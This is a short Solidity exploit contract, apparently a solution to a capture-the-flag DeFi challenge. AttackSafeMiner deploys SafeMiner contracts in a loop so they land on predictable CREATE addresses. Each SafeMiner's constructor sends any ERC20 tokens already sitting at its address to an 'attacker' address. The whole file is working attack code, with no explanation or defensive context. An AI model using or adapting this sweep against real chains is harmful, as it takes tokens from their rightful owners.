// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract AttackSafeMiner {
    constructor(address attacker, address token, uint256 nonce) {
        for (uint256 i; i < nonce; i++) {
            new SafeMiner(attacker, IERC20(token));
        }
    }
}

contract SafeMiner {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
